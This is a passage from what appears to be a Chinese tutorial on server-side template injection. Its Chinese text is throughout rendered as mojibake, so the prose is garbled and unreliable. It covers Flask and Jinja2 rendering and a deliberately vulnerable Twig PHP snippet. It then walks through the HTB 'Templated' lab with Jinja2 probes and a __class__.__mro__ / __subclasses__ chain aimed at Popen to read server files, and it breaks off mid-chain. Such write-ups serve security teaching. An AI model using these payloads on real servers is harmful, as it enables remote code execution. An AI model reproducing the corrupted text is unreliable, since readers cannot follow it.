·æ–¹ä¾¿å±•ç¤ºå’Œç®¡ç†ã€‚å½“ç”¨æˆ·è¾“å…¥è‡ªå·±çš„æ•°æ®ä¿¡æ¯ï¼ŒHTMLé¡µé¢å¯ä»¥æ ¹æ®ç”¨æˆ·è‡ªèº«çš„ä¿¡æ¯æ¥å±•ç¤ºé¡µé¢ï¼Œå› æ­¤æ‰æœ‰äº†è¿™ä¸ªå‡½æ•°çš„ä½¿ç”¨ã€‚ 3. æ³¨å…¥çš„æ€æƒ³ ç”¨å‡½æ•°ä¸æ–­è°ƒç”¨æˆ‘ä»¬è¦ä½¿ç”¨çš„å‘½ä»¤ï¼šfileã€readã€openã€lsç­‰ç­‰å‘½ä»¤ï¼Œæˆ‘ä»¬ç”¨è¿™äº›æ¥è¯»å–å†™å…¥é…ç½®æ–‡ä»¶ï¼› 4. ä»€ä¹ˆæ˜¯æ¨¡æ¿å¼•æ“ æ˜¯ä¸ºäº†ä½¿ ç”¨æˆ·ç•Œé¢å’Œ ä¸šåŠ¡æ•°æ®ï¼ˆå†…å®¹ï¼‰åˆ†ç¦»è€Œäº§ç”Ÿçš„ï¼Œå®ƒå¯ä»¥ç”Ÿæˆç‰¹å®šæ ¼å¼çš„æ–‡æ¡£ï¼Œåˆ©ç”¨æ¨¡æ¿å¼•æ“æ¥ç”Ÿæˆå‰ç«¯çš„HTMLä»£ç ï¼Œæ¨¡æ¿å¼•æ“ä¼šæä¾›ä¸€å¥—ç”ŸæˆHTMLä»£ç çš„ç¨‹åºï¼Œä¹‹ååªéœ€è·å–ç”¨æˆ·çš„æ•°æ®ï¼Œæ”¾å…¥æ¸²æŸ“å‡½æ•°ï¼Œè¯¥æ•°æ®ä¾¿ä¼šåµŒå…¥ç”Ÿæˆå¥½çš„HTMLé¡µé¢ä¸­ï¼Œç„¶ååé¦ˆç»™æµè§ˆå™¨ï¼Œå‘ˆç°åœ¨ç”¨æˆ·é¢å‰ å½“å‰çš„ä¸»æµæ¡†æ¶ï¼Œä¸€èˆ¬éƒ½é‡‡ç”¨MVCæ¨¡å¼ï¼Œå³ï¼šModel-View-Controllerï¼Œç”¨æˆ·çš„è¾“å…¥å…ˆè¿›å…¥Controlleræ§åˆ¶å™¨ï¼Œç„¶åæ ¹æ®æ¸…æµç±»å‹å’Œè¯·æ±‚çš„æŒ‡ä»¤å‘é€ç»™å¯¹åº”çš„Modelä¸šåŠ¡æ¨¡å‹ï¼Œç”±Modelå±‚è¿›è¡Œä¸šåŠ¡é€»è¾‘çš„åˆ¤æ–­ã€æ•°æ®åº“çš„å­˜å–ç­‰ï¼Œæœ€åæŠŠç»“æœè¿”å›ç»™Viewè§†å›¾å±‚ï¼Œå†ç»æ¨¡æ¿å¼•æ“çš„æ¸²æŸ“å±•ç¤ºç»™ç”¨æˆ· æ¨¡æ¿å¼•æ“çš„åŸºæœ¬æœºç†å°±æ˜¯æ›¿æ¢ï¼ˆè½¬æ¢ï¼‰ï¼šå°†æŒ‡å®šçš„æ ‡ç­¾è½¬æ¢ä¸ºéœ€è¦çš„ä¸šåŠ¡æ•°æ®ï¼›å°†æŒ‡å®šçš„ä¼ªè¯­å¥æŒ‰ç…§æŸç§æµç¨‹æ¥å˜æ¢è¾“å‡º å¼•ç”¨ä¸€æ®µä»£ç æ¥ç®€å•è¯´ä¸€ä¸‹ï¼š // æ¨¡æ¿ var template = '&lt;p&gt;Hello,my name is &lt;%name%&gt;.I am &lt;%age%&gt; years old.&lt;/p&gt;'; // ç”¨äºåŒ¹é…çš„æ­£åˆ™ /* ç”¨äºè¿‡æ»¤å‡ºä»¥&lt;%å¼€å¤´ï¼Œ%&gt;ç»“å°¾ï¼Œå¹¶ä¸”ä¸­é—´ä¸åŒ…å«%æˆ–&gt;çš„åŒ¹é…é¡¹ å…¶ç›®çš„åœ¨äºè¿‡æ»¤å‡ºtemplateä¸­çš„ &lt;%name%&gt; å’Œ &lt;%age%&gt; */ var regex = /&lt;%([^%]+)?%&gt;/g; // æ•°æ® var data = { name:'Deutsh', age:22 } // æ¨¡æ¿å¼•æ“ var TemplateEngine = function (template,data) { // execä½¿ç”¨å…¨å±€æ­£åˆ™è¡¨è¾¾å¼æ„å‘³ç€åœ¨å¾ªç¯ä¸­ä½¿ç”¨ï¼Œå› ä¸ºå®ƒä»ç„¶ä¼šæ£€ç´¢æ‰€æœ‰åŒ¹é…çš„å­è¡¨è¾¾å¼ // /regex/.exec()ä»…è¿”å›æ‰¾åˆ°çš„ç¬¬ä¸€ä¸ªåŒ¹é…é¡¹ while (match = regex.exec(template)) { template = template.replace(match[0],data[match[1]]) } return template; } // æœ€ç»ˆçš„æ‰§è¡Œåœ¨æ­¤å¤„ var string = TemplateEngine(template,data) console.log(string) ä¸Šè¿°ä»£ç ï¼Œæˆ‘ä»¬çš„ç›®çš„æ˜¯ï¼šå°†æ•°æ®æ–‡ä»¶ä¸­å¯¹åº”çš„nameå’Œageæ›¿æ¢åˆ°æ¨¡æ¿æ–‡ä»¶ä¸­ ä¸»è¦çš„æ‰§è¡Œåœ¨æ¨¡æ¿å¼•æ“çš„whileå‡½æ•°ä¸­ï¼Œmatch = regex.exec(template)ä¼šè¿”å›ä¸€ä¸ªarrayï¼Œè¿™ä¸ªæ•°ç»„ä¸­åŒ…å«äº†å¤šä¸ªé¡¹ç›® âš ï¸ ä¸ºä»€ä¹ˆä¼šåŒ…å«ä¸¤é¡¹å‘¢ï¼šå½“æ­£åˆ™è¡¨è¾¾å¼è®¾ç½® g æ ‡å¿—ä½æ—¶ï¼Œå¯ä»¥å¤šæ¬¡æ‰§è¡Œ exec æ–¹æ³•æ¥æŸ¥æ‰¾åŒä¸€ä¸ªå­—ç¬¦ä¸²ä¸­çš„æˆåŠŸåŒ¹é… ä¹‹åtemplate = template.replace(match[0],data[match[1]])ç­‰åŒäºtemplate = template.replace(\"&lt;%name%&gt;\",data[\"name\"])å®Œæˆæ¨¡æ¿ä¸­æ•°æ®çš„æ›¿æ¢ 5. å¼•å‘SSTIçš„çœŸæ­£åŸå›  render_templateæ¸²æŸ“å‡½æ•°çš„é—®é¢˜ æ¸²æŸ“å‡½æ•°åœ¨æ¸²æŸ“çš„æ—¶å€™ï¼Œå¾€å¾€å¯¹ç”¨æˆ·è¾“å…¥çš„å˜é‡ä¸åšæ¸²æŸ“ã€‚ ä¹Ÿå°±æ˜¯è¯´ä¾‹å¦‚ï¼š`{{}}`åœ¨Jinja2ä¸­ä½œä¸ºå˜é‡åŒ…è£¹æ ‡è¯†ç¬¦ï¼ŒJinja2åœ¨æ¸²æŸ“çš„æ—¶å€™ä¼šæŠŠ`{{}}`åŒ…è£¹çš„å†…å®¹å½“åšå˜é‡è§£ææ›¿æ¢ã€‚æ¯”å¦‚`{{1+1}}`ä¼šè¢«è§£ææˆ2ã€‚å¦‚æ­¤ä¸€æ¥å°±å¯ä»¥å®ç°å¦‚åŒsqlæ³¨å…¥ä¸€æ ·çš„æ³¨å…¥æ¼æ´ã€‚ è¿˜æ¯”å¦‚è¯´ ç”±å‰é¢æ¨¡æ¿ä»£ç å®‰åˆ©çš„æ¼”ç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å‘ç°ï¼Œè‹¥æœåŠ¡ç«¯æ¥å—äº†ç”¨æˆ·çš„è¾“å…¥åï¼ˆæ¯”å¦‚å¯¹äºä¸Šè¿°æ¡ˆä¾‹ï¼Œdataçš„nameå’Œageçš„æ•°æ®ç”±æ•°æ®çš„è¾“å…¥/æäº¤/è¯·æ±‚è€Œå¾—ï¼‰ï¼Œæœªç»ä»»ä½•å¤„ç†å°±å°†å…¶ä½œä¸ºWebåº”ç”¨æ¨¡æ¿å†…å®¹çš„ä¸€éƒ¨åˆ†ï¼Œå°±ä¼šå¯¼è‡´æ¨¡æ¿å¼•æ“åœ¨è¿›è¡Œç›®æ ‡ç¼–è¯‘æ¸²æŸ“çš„è¿‡ç¨‹ä¸­ï¼Œæ‰§è¡Œäº†ç”¨æˆ·æ’å…¥çš„å¯æ‰§è¡Œè¯­å¥ï¼Œä»è€Œå¯èƒ½å¯¼è‡´ä¿¡æ¯æ³„éœ²ã€ä»£ç æ‰§è¡Œç­‰é—®é¢˜ å‡¡æ˜¯ä½¿ç”¨æ¨¡æ¿çš„åœ°æ–¹ï¼ŒSSTIæ˜¯ç»•ä¸è¿‡çš„é—®é¢˜ï¼Œæ¨¡æ¿å¼•æ“å¯ç”±å¤šç§è¯­è¨€å®ç°ï¼Œæ‰€ä»¥SSTIä¹Ÿå°±å‡ºç°åœ¨äº†å¤šç§è¯­è¨€ç¯å¢ƒä¸­ æ¨¡æ¿å¼•æ“è®¾è®¡å‡ºæ¥çš„ä¸€ç§é˜²æŠ¤æœºåˆ¶ï¼Œä¸å…è®¸ä½¿ç”¨æ²¡æœ‰å®šä¹‰æˆ–è€…å£°æ˜çš„æ¨¡å—ï¼Œè¿™é€‚ç”¨äºæ‰€æœ‰çš„æ¨¡æ¿å¼•æ“ã€‚ 6. routeè£…é¥°å™¨è·¯ç”± @app.route('/') ä½¿ç”¨routeï¼ˆï¼‰è£…é¥°å™¨å‘Šè¯‰Flaskä»€ä¹ˆæ ·çš„URLèƒ½è§¦å‘æˆ‘ä»¬çš„å‡½æ•°.routeï¼ˆï¼‰è£…é¥°å™¨æŠŠä¸€ä¸ªå‡½æ•°ç»‘å®šåˆ°å¯¹åº”çš„URLä¸Šï¼Œè¿™å¥è¯ç›¸å½“äºè·¯ç”±ï¼Œä¸€ä¸ªè·¯ç”±è·Ÿéšä¸€ä¸ªå‡½æ•°ï¼Œå¦‚ @app.route('/') def test()\" return 123 è®¿é—®127.0.0.1:5000/åˆ™ä¼šè¾“å‡º123ï¼Œæˆ‘ä»¬ä¿®æ”¹ä¸€ä¸‹è§„åˆ™ è¿™ä¸ªæ—¶å€™è®¿é—®127.0.0.1:5000/testä¼šè¾“å‡º123. æ­¤å¤–è¿˜å¯ä»¥è®¾ç½®åŠ¨æ€ç½‘å€ï¼Œ @app.route(\"/hello/&lt;username&gt;\") def hello_user(username): return \"user:%s\"%username æ ¹æ®urlé‡Œçš„è¾“å…¥ï¼ŒåŠ¨æ€è¾¨åˆ«èº«ä»½ï¼Œæ­¤æ—¶ä¾¿å¯ä»¥çœ‹åˆ°å¦‚ä¸‹é¡µé¢ï¼š æˆ–è€…å¯ä»¥ä½¿ç”¨intå‹ï¼Œè½¬æ¢å™¨æœ‰ä¸‹é¢å‡ ç§ï¼š int æ¥å—æ•´æ•° float åŒ int ï¼Œä½†æ˜¯æ¥å—æµ®ç‚¹æ•° path å’Œé»˜è®¤çš„ç›¸ä¼¼ï¼Œä½†ä¹Ÿæ¥å—æ–œçº¿ @app.route('/post/&lt;int:post_id&gt;') def show_post(post_id): # show the post with the given id, the id is an integer return 'Post %d' % post_id 7. mainå…¥å£ â€‹ å½“.pyæ–‡ä»¶è¢«ç›´æ¥è¿è¡Œæ—¶ï¼Œif name == â€˜mainâ€˜ä¹‹ä¸‹çš„ä»£ç å—å°†è¢«è¿è¡Œï¼›å½“.pyæ–‡ä»¶ä»¥æ¨¡å—å½¢å¼è¢«å¯¼å…¥æ—¶ï¼Œif name == â€˜mainâ€˜ä¹‹ä¸‹çš„ä»£ç å—ä¸è¢«è¿è¡Œã€‚å¦‚æœä½ ç»å¸¸ä»¥cmdæ–¹å¼è¿è¡Œè‡ªå·±å†™çš„pythonå°è„šæœ¬ï¼Œé‚£ä¹ˆä¸éœ€è¦è¿™ä¸ªä¸œè¥¿ï¼Œä½†æ˜¯å¦‚æœéœ€è¦åšä¸€ä¸ªç¨å¾®å¤§ä¸€ç‚¹çš„pythonå¼€å‘ï¼Œå†™ if name ==â€™main__â€™ æ˜¯ä¸€ä¸ªè‰¯å¥½çš„ä¹ æƒ¯ï¼Œå¤§ä¸€ç‚¹çš„pythonè„šæœ¬è¦åˆ†å¼€å‡ ä¸ªæ–‡ä»¶æ¥å†™ï¼Œä¸€ä¸ªæ–‡ä»¶è¦ä½¿ç”¨å¦ä¸€ä¸ªæ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ¨¡å—ï¼Œæ­¤æ—¶è¿™ä¸ªifå°±ä¼šèµ·åˆ°ä½œç”¨ä¸ä¼šè¿è¡Œè€Œæ˜¯ç±»ä¼¼äºæ–‡ä»¶åŒ…å«æ¥ä½¿ç”¨ã€‚ if __name__ == '__main__': app.debug = True app.run() æµ‹è¯•çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨debugï¼Œæ–¹ä¾¿è°ƒè¯•ï¼Œå¢åŠ ä¸€å¥ app.debug = True æˆ–è€…ï¼ˆæ•ˆæœæ˜¯ä¸€æ ·çš„ï¼‰ app.run(debug=True) è¿™æ ·æˆ‘ä»¬ä¿®æ”¹ä»£ç çš„æ—¶å€™ç›´æ¥ä¿å­˜ï¼Œç½‘é¡µåˆ·æ–°å°±å¯ä»¥äº†ï¼Œå¦‚æœä¸åŠ debugï¼Œé‚£ä¹ˆæ¯æ¬¡ä¿®æ”¹ä»£ç éƒ½è¦è¿è¡Œä¸€æ¬¡ç¨‹åºï¼Œå¹¶ä¸”æŠŠå‰ä¸€ä¸ªç¨‹åºå…³é—­ã€‚å¦åˆ™ä¼šè¢«å‰ä¸€ä¸ªç¨‹åºè¦†ç›–ã€‚ app.run(host='0.0.0.0') è¿™ä¼šè®©æ“ä½œç³»ç»Ÿç›‘å¬æ‰€æœ‰å…¬ç½‘ IP,æ­¤æ—¶ä¾¿å¯ä»¥åœ¨å…¬ç½‘ä¸Šçœ‹åˆ°è‡ªå·±çš„webã€‚ 8. æ¨¡æ¿æ¸²æŸ“ï¼ˆé‡ç‚¹ï¼‰ ä½ å¯ä»¥ä½¿ç”¨ render_template() æ–¹æ³•æ¥æ¸²æŸ“æ¨¡æ¿ã€‚ä½ éœ€è¦åšçš„ä¸€åˆ‡å°±æ˜¯å°†æ¨¡æ¿åå’Œä½ æƒ³ä½œä¸ºå…³é”®å­—çš„å‚æ•°ä¼ å…¥æ¨¡æ¿çš„å˜é‡ã€‚è¿™é‡Œæœ‰ä¸€ä¸ªå±•ç¤ºå¦‚ä½•æ¸²æŸ“æ¨¡æ¿çš„ç®€ä¾‹: ç®€å•çš„æ¨¡ç‰ˆæ¸²æŸ“ç¤ºä¾‹ from flask import render_template @app.route('/hello/') @app.route('/hello/&lt;name&gt;') def hello(name=None): return render_template('hello.html', name=name)//æˆ‘ä»¬hello.htmlæ¨¡æ¿æœªåˆ›å»ºæ‰€ä»¥è¿™æ®µä»£ç æš‚æ—¶ä¾›è§‚èµï¼Œä¸å¦¨å¾€ä¸‹ç»§ç»­çœ‹ æˆ‘ä»¬ä»æ¨¡æ¿æ¸²æŸ“å¼€å§‹å®ä¾‹ï¼Œå› ä¸ºæˆ‘ä»¬æ¯•ç«Ÿä¸æ˜¯åšå¼€å‘çš„ï¼Œflaskä»¥æ¨¡æ¿æ³¨å…¥é—»å- -ï¼ï¼Œæ‰€ä»¥æˆ‘ä»¬å…ˆä»flaskæ¨¡ç‰ˆæ¸²æŸ“å…¥æ‰‹æ·±å…¥å‰–æã€‚ é¦–å…ˆè¦ææ¸…æ¥šï¼Œæ¨¡æ¿æ¸²æŸ“ä½“ç³»ï¼Œrender_templateå‡½æ•°æ¸²æŸ“çš„æ˜¯templatesä¸­çš„æ¨¡æ¿ï¼Œæ‰€è°“æ¨¡æ¿æ˜¯æˆ‘ä»¬è‡ªå·±å†™çš„htmlï¼Œé‡Œé¢çš„å‚æ•°éœ€è¦æˆ‘ä»¬æ ¹æ®æ¯ä¸ªç”¨æˆ·éœ€æ±‚ä¼ å…¥åŠ¨æ€å˜é‡ã€‚ â”œâ”€â”€ app.py â”œâ”€â”€ static â”‚ â””â”€â”€ style.css â””â”€â”€ templates â””â”€â”€ index.html æˆ‘ä»¬å†™ä¸€ä¸ªindex.htmlæ–‡ä»¶å†™templatesæ–‡ä»¶å¤¹ä¸­ã€‚ &lt;html&gt; &lt;head&gt; &lt;title&gt;{{title}} - å°çŒªä½©å¥‡&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Hello, {{user.name}}!&lt;/h1&gt; &lt;/body&gt; &lt;/html&gt; é‡Œé¢æœ‰ä¸¤ä¸ªå‚æ•°éœ€è¦æˆ‘ä»¬æ¸²æŸ“ï¼Œuser.nameï¼Œä»¥åŠtitle æˆ‘ä»¬åœ¨app.pyæ–‡ä»¶é‡Œè¿›è¡Œæ¸²æŸ“ã€‚ @app.route('/') @app.route('/index')#æˆ‘ä»¬è®¿é—®/æˆ–è€…/indexéƒ½ä¼šè·³è½¬ def index(): user = {'name': 'å°çŒªä½©å¥‡'}#ä¼ å…¥ä¸€ä¸ªå­—å…¸æ•°ç»„ return render_template(\"index.html\",title='Home',user=user) Imageè¿™æ¬¡æ¸²æŸ“æˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨ç”¨æˆ·å¯æ§ï¼Œæ‰€ä»¥æ˜¯å®‰å…¨çš„ï¼Œå¦‚æœæˆ‘ä»¬äº¤ç»™ç”¨æˆ·å¯æ§å¹¶ä¸”ä¸è¿‡æ»¤å‚æ•°å°±æœ‰å¯èƒ½é€ æˆSSTIæ¨¡æ¿æ³¨å…¥æ¼æ´ã€‚ 2.2. åˆ¤æ–­SSTIç±»å‹ ä¸Šé¢æåˆ°ç½‘ç«™æ¨¡æ¿å¼•æ“æœ‰jinja2ã€tornadoã€smartyã€twigç­‰ç­‰ï¼Œé‚£ä¹ˆå¦‚ä½•åˆ¤æ–­é‡åˆ°çš„æ˜¯å“ªç§ç±»å‹ï¼Ÿ å¹¿ä¸ºæµä¼ çš„å°±æ˜¯è¿™å¼ å›¾äº†ï¼Œæ ¹æ®å¤„ç†è¿”å›å€¼çš„ä¸åŒæ¥è¿›è¡Œåˆ¤åˆ«ã€‚ï¼ˆæ³¨æ„æ‹¬å·çš„æ•°é‡ç­‰ï¼‰ 1. å¸¸è§çš„æ¨¡æ¿å¼•æ“ PHP Twigæ¨¡æ¿å˜é‡ï¼š{{%s}} Smartyæ¨¡æ¿å˜é‡ï¼š{%s} Bladeæ¨¡æ¿å˜é‡ï¼š{{%s}} Python Jinja2æ¨¡æ¿å˜é‡ï¼š{{%s}} Tornadoæ¨¡æ¿å˜é‡ï¼š{{%s}} Djangoæ¨¡æ¿å˜é‡ï¼š{{ }} Java FreeMarkeræ¨¡æ¿å˜é‡ï¼š&lt;#%s&gt;``${%s} Velocityæ¨¡æ¿å˜é‡ï¼š#set($x=1+1)${x} æ¨¡æ¿å¼•æ“ä¼—å¤šï¼Œå„ä¸ªæ¨¡æ¿å¼•æ“çš„è¯­æ³•ä¹Ÿä¸å°½ç›¸åŒï¼Œæˆ‘ä»¬æœ€ä¸»è¦çš„æ˜¯èƒ½å®šä½å‡ºæ˜¯å¦å­˜åœ¨SSTIæ¼æ´ï¼Œè‡³äºåç»­çš„åˆ©ç”¨ï¼Œæˆ‘ä»¬æŒæ¡ä¸€äº›ï¼Œå…¶ä½™çš„è§åˆ°å†æŸ¥å³å¯ Jinja2 Jinja2 æ˜¯ä¸€ç§é¢å‘Pythonçš„ç°ä»£å’Œè®¾è®¡å‹å¥½çš„æ¨¡æ¿è¯­è¨€ï¼Œå®ƒæ˜¯ä»¥Djangoçš„æ¨¡æ¿ä¸ºæ¨¡å‹çš„ã€‚ Jinja2 æ˜¯ Flask æ¡†æ¶çš„ä¸€éƒ¨åˆ†ã€‚Jinja2 ä¼šæŠŠæ¨¡æ¿å‚æ•°æä¾›çš„ç›¸åº”çš„å€¼æ›¿æ¢äº† {{â€¦}} å—ã€‚ Jinja2 æ¨¡æ¿åŒæ ·æ”¯æŒæ§åˆ¶è¯­å¥ï¼Œåƒåœ¨ {%â€¦%} å—ä¸­ã€‚ æ§åˆ¶ç»“æ„ {% %} å¯ä»¥å£°æ˜å˜é‡ï¼Œä¹Ÿå¯ä»¥æ‰§è¡Œè¯­å¥ å˜é‡å–å€¼ {{ }} ç”¨äºå°†è¡¨è¾¾å¼æ‰“å°åˆ°æ¨¡æ¿è¾“å‡º æ³¨é‡Šå— {# #} ç”¨äºæ³¨é‡Š 2. å¦‚ä½•æµ‹è¯•æ˜¯å¦å­˜åœ¨SSTI ç®€å•æ¥è¯´ï¼Œå°±æ˜¯æ›´æ”¹è¯·æ±‚å‚æ•°ä½¿ä¹‹æ‰¿è½½å«æœ‰æ¨¡æ¿å¼•æ“è¯­æ³•çš„ Payloadï¼Œé€šè¿‡é¡µé¢æ¸²æŸ“è¿”å›çš„å†…å®¹æ£€æµ‹æ‰¿è½½çš„ Payload æ˜¯å¦æœ‰å¾—åˆ°ç¼–è¯‘è§£æï¼Œæœ‰è§£æåˆ™å¯ä»¥åˆ¤å®šå«æœ‰ Payload å¯¹åº”æ¨¡æ¿å¼•æ“æ³¨å…¥ï¼Œå¦åˆ™ä¸å­˜åœ¨ SSTI æ­¤å¤„æˆ‘ä»¬æ‹¿æ¥bmjokerå¸ˆå‚…æä¾›çš„ä¸€æ®µç¤ºä¾‹ä»£ç  Twigæ¨¡æ¿å¼•æ“ç¤ºä¾‹ä»£ç  &lt;?php require_once dirname(__FILE__).'\\twig\\lib\\Twig\\Autoloader.php'; Twig_Autoloader::register(true); // Twig_Loader_Array ç”¨äºå®šä½æ¨¡æ¿ å†…ç½®çš„åŠ è½½å™¨ // Twig_Environment æ¥å­˜å‚¨é…ç½®ä¿¡æ¯ å†…ç½®çš„ç¯å¢ƒå˜é‡ $twig = new Twig_Environment(new Twig_Loader_String()); // render() æ–¹æ³•é€šè¿‡å…¶ç¬¬ä¸€ä¸ªå‚æ•°è½½å…¥æ¨¡æ¿ï¼Œ**å¹¶é€šè¿‡ç¬¬äºŒä¸ªå‚æ•°ä¸­çš„å˜é‡æ¥æ¸²æŸ“æ¨¡æ¿**ï¼ï¼é‡è¦ï¼ï¼ // æ¨¡ç‰ˆå«æœ‰ {{name}} å˜é‡ï¼Œå…¶æ¨¡ç‰ˆå˜é‡å€¼æ¥è‡ªäºGETè¯·æ±‚å‚æ•°$_GET[\"name\"] $output = $twig-&gt;render(\"Hello {{name}}\", array(\"name\" =&gt; $_GET[\"name\"])); // å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå˜é‡çš„å€¼ echo $output; ?&gt; è¿™æ®µä»£ç ä¸­ï¼Œç”±äºæ¨¡æ¿å¼•æ“ä¸€èˆ¬éƒ½ä¼šé»˜è®¤å¯¹æ¸²æŸ“çš„å˜é‡å€¼è¿›è¡Œç¼–ç å’Œè½¬ä¹‰ã€‚æ‰€ä»¥ä¸€èˆ¬æƒ…å†µä¸‹å¹¶ä¸ä¼šå­˜åœ¨XSSç­‰æ”»å‡»çš„å¯èƒ½ è‹¥å°±å¦‚æˆ‘ä»¬æœ€å¼€å§‹çš„ä¾‹å­æ‰€è¯´ï¼Œè‹¥æ¨¡æ¿å¼•æ“æ¸²æŸ“çš„å†…å®¹å—æˆ‘ä»¬æ§åˆ¶äº†ï¼Œå°±ä¸ä¸€å®šäº† // ä¸Šè¿°ä»£ç åŸºæœ¬å†…å®¹ä¸å˜ï¼Œ$outputåçš„å†…å®¹å‘ç”Ÿå˜åŒ– $output=$twig-&gt;render(\"Hello {$_GET['name']}\");// å°†ç”¨æˆ·è¾“å…¥ä½œä¸ºæ¨¡ç‰ˆå†…å®¹çš„ä¸€éƒ¨åˆ† æ­¤æ—¶renderå‡½æ•°ç”±äºç¼ºå°‘ç¬¬äºŒä¸ªå‚æ•°ï¼Œæ‰€ä»¥ç›´æ¥å°±ä¼šæŠŠ\"Hello ç”¨æˆ·çš„è¾“å…¥\"æ‹¼å¦‚æ¨¡æ¿è¿›è¡Œæ¸²æŸ“,è¿™å°±ç›¸å½“äºæ”¹å˜äº†æœ€åˆçš„æ¨¡æ¿ï¼Œç”±äºæ¨¡æ¿æœ€åˆæ˜¯ç”±å¼€å‘è€…å®šä¹‰çš„ï¼Œæ‰€ä»¥ä»–ä¼šå—åˆ°â€œä¿¡ä»»â€ å¯¹äºTwigæ¨¡æ¿çš„å˜é‡`{{%s}}`é™¤äº†ä¼ é€’å˜é‡å¤–ï¼Œè¿˜å¯ä»¥æ‰§è¡Œè¡¨è¾¾å¼ï¼Œæœ€ç®€å•çš„è¡¨è¾¾å¼å°±æ˜¯{{2*2}}ï¼Œè¿™ä¹Ÿæ˜¯è¾¨è®¤æ˜¯å¦å­˜åœ¨SSTIæœ€åŸºæœ¬çš„æŒ‡çº¹ï¼Œè‹¥æˆ‘ä»¬è¾“å…¥{{2*2}}ï¼ŒHTMLé¡µé¢è¿”å›å…¶å…¶ç»“æœ4ï¼Œå°±è¯´æ˜è¯¥è¡¨è¾¾å¼è¢«è§£æï¼Œå­˜åœ¨SSTI 3. é¶åœºå®æˆ˜ HTB-Templated é¢˜ç›®ç›´æ¥æç¤ºæˆ‘ä»¬æœ¬ä½“ä½¿ç”¨çš„æ¨¡æ¿å¼•æ“ä¸º**Jinja2**ï¼Œæ ¹æ®æˆ‘ä»¬ä¹‹å‰æ€»ç»“çš„å„ä¸ªæ¨¡æ¿å¼•æ“çš„å˜é‡ç±»å‹ï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“è¯¥å˜é‡çš„ç±»å‹æ˜¯ **{{%s}}**ï¼Œæ‰€ä»¥è¯ä¸å¤šè¯´æˆ‘ä»¬ç›´æ¥æ‹¼æ¥å°è¯• payload={{2 * 2}} 2*2è¢«è®¡ç®—ï¼Œç¡®è®¤å­˜åœ¨SSTIæ¨¡æ¿æ³¨å…¥ exp æœ¬é¢˜çš„é‡ç‚¹è¿˜æ˜¯åœ¨åˆ©ç”¨æ–¹é¢ï¼šç”±äºæˆ‘ä»¬çš„ç›®æ ‡æ˜¯è¯»å–å¤„äºæœåŠ¡å™¨æœ¬åœ°çš„ä¸€ä¸ªå­˜æœ‰Flagçš„æ–‡ä»¶ï¼Œæ‰€ä»¥æˆ‘ä»¬çš„é‡ç‚¹æ˜¯æ‰¾åˆ°ä¸€ä¸ªå«æœ‰æŸç§è¯»å–æ–‡ä»¶çš„å‡½æ•°çš„ç±»ï¼ˆPythonä¸­ï¼‰ï¼Œæˆ‘ä»¬é€šè¿‡æŸ¥é˜…æ‰‹å†Œå‘ç°å¯ä»¥åˆ©ç”¨Popenå‡½æ•°å®Œæˆè¯¥åŠŸèƒ½ï¼Œè°ƒç”¨è¯¥å‡½æ•°ä¼šè¿”å›ä¸€ä¸ªæ–‡ä»¶çš„å¥æŸ„ï¼Œç„¶åå†é…åˆread()å‡½æ•°è¯»å–å³å¯ è¯¥å‡½æ•°ä¼šæ‰§è¡Œforkä¸€ä¸ªå­è¿›ç¨‹æ‰§è¡Œcommandè¿™ä¸ªå‘½ä»¤ï¼ŒåŒæ—¶å°†å­è¿›ç¨‹çš„æ ‡å‡†è¾“å‡ºé€šè¿‡ç®¡é“è¿æ¥åˆ°çˆ¶è¿›ç¨‹ï¼Œå¯¹äºæ–‡ä»¶åœ¨çˆ¶è¿›ç¨‹è°ƒç”¨read()è¯»å–å³å¯ï¼Œå¯¹äºå‘½ä»¤åœ¨çˆ¶è¿›ç¨‹ä¼šè¢«æ‰§è¡Œ é‚£ä¹ˆä¸‹é¢çš„é‡ç‚¹å°±æ˜¯ï¼Œå¦‚ä½•æ‰¾åˆ°Popenè¿™ä¸ªå‡½æ•°æ‰€å±çš„ç±»ï¼Œä¸€èˆ¬æœ‰ä¸¤ç§æ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆè¯´ç¬¬ä¸€ç§ ç”±äºæˆ‘ä»¬æƒ³è¦æ‰¾çš„æ˜¯ä¸€ä¸ªå­ç±»ï¼Œæ‰€ä»¥ç¬¬ä¸€æ­¥å³ä½¿æ‰¾åˆ°å…¶å¯¹è±¡åŸºç±» å³class 'object'ï¼Œä¸ºäº†è¾¾åˆ°è¿™æ­¥ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨__mro__å±æ€§æ¥è®¿é—®å¯¹è±¡çš„ç»§æ‰¿ç±»ï¼Œä½†æˆ‘ä»¬ç›®å‰æ²¡æœ‰å¯¹è±¡ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±æ„é€ ä¸€ä¸ªç©ºå­—ç¬¦ä¸²: `{{\"\".__class__.__mro__}}`å…¶ä¸­`__class__`ç”¨äºè¿”å›è°ƒç”¨çš„å‚æ•°ç±»å‹ å¯ä»¥çœ‹å‡ºè¯¥å­ç±»ç»§æ‰¿è‡ªclass'str'ä¸class 'object'å¹¶ä»¥ä¸€ä¸ªå…ƒç»„è¿”å›ï¼Œæˆ‘ä»¬é€šè¿‡ç´¢å¼•è·å¾—å¯¹è±¡ç±» {{\"\".__class__.__mro__[1]}} æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬è¦åˆ—ä¸¾å‡ºæ‰€æœ‰é›†æˆè‡ªobjectçš„å­ç±»ï¼Œé€šè¿‡å¯¹è¯¥å¯¹è±¡è°ƒç”¨__subclasses__æ–¹æ³• {{\"\".__class__.__mro__[1].__subclasses__()}} ä½†è¿™æœ‰ä¸€ä¸ªæ˜æ˜¾çš„ç¼ºç‚¹å°±æ˜¯ï¼Œå¥½å®¶ä¼™ï¼Œè¿™ä¹ˆå¤šå­ç±»ï¼Œæ€ä¹ˆå¯èƒ½æ‰¾å¾—åˆ°ï¼Œä¸ºäº†ç¼©å°èŒƒå›´æˆ‘ä»¬å¯¹å…¶è¿›è¡Œåˆ‡ç‰‡ `{{\"\".__class__.__mro__[1].__subclasses__()[400:]}}`æŸ¥æ‰¾400ä¸ªä»¥åçš„å…ƒç´  